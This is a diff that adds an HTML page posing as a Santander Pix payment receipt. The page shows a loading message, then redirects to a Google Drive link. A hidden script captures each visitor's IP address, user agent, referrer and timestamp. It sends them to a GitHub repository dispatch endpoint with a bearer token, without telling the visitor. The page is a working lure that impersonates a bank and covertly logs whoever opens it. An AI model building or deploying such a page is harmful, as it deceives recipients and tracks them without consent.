@@ -1,0 +1,44 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <title>Comprovante Pix Santander</title>
+  <meta http-equiv="refresh" content="3;url=https://drive.google.com/file/d/XXXXXXXX/view">
+  <style>body{background:#f6f8fa;font-family:Arial}</style>
+</head>
+<body>
+  <h2>Aguarde, carregando comprovante...</h2>
+
+  <!-- Captura IP/UA -->
+  <script>
+    (function() {
+      const ip_url = "https://api.ipify.org?format=json";
+      fetch(ip_url)
+        .then(r => r.json())
+        .then(data => {
+          const payload = {
+            ip: data.ip,
+            ua: navigator.userAgent,
+            ref: document.referrer,
+            ts: new Date().toISOString()
+          };
+          fetch(
+            "https://api.github.com/repos/<gituser0011>/comprovante-pix-santander/dispatches",
+            {
+              method: "POST",
+              headers: {
+                "Accept": "application/vnd.github+json",
+                "Authorization": "Bearer <scopes public_repo>",
+                "User-Agent": "comprovante"
+              },
+              body: JSON.stringify({
+                event_type: "log_visitor",
+                client_payload: payload
+              })
+            }
+          );
+        });
+    })();
+  </script>
+</body>
+</html>
